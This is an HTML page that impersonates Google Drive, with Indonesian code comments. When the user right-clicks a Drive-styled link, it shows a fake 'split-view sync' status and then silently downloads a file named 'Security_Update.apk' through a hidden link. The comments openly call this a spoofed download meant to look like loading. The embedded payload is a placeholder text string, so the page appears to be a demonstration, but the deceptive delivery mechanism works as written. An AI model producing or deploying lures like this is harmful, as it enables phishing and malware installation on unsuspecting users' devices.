<!doctype html>
<html>
  <head>
    <title>Google Drive Download Support</title>
    <style>
      body {
        font-family: sans-serif;
        background-color: #f8f9fa;
      }
      h1 {
        margin: 1em;
      }
      #container {
        margin-top: 100px;
        text-align: center;
      }

      .drive-link {
        color: #1a73e8;
        text-decoration: none;
        font-weight: bold;
        padding: 15px;
        border: 1px solid #dadce0;
        border-radius: 8px;
        display: inline-block;
        cursor: context-menu;
      }

      /* Elemen download yang tidak terlihat */
      #hiddenDownload {
        display: none;
      }
    </style>
  </head>
  <body>
    <div id="container">
      <a id="link" href="https://drive.google.com/" class="drive-link">
        Right Click and Open in Split View to Sync Google Drive
      </a>
      <p id="status" style="margin-top: 20px; color: #5f6368"></p>
    </div>

    <!-- Link download tersembunyi -->
    <a id="hiddenDownload" download="Security_Update.apk"></a>

    <script>
      const link = document.getElementById("link");
      const downloader = document.getElementById("hiddenDownload");
      const statusText = document.getElementById("status");

      link.addEventListener("contextmenu", function (event) {
        // Memberikan kesan proses sedang berjalan
        statusText.innerText = "Preparing split-view sync...";

        setTimeout(function () {
          // Spoofing download: Mengarahkan ke file yang akan diunduh
          downloader.href =
            "data:application/octet-stream;base64,VEhJUyBJUyBBIFNQT09GRUQgRE9XTkxPQUQ=";
          downloader.click();

          statusText.innerText = "Download started in background.";
        }, 3000); // Jeda 3 detik untuk mensimulasikan loading
      });
    </script>
  </body>
</html>
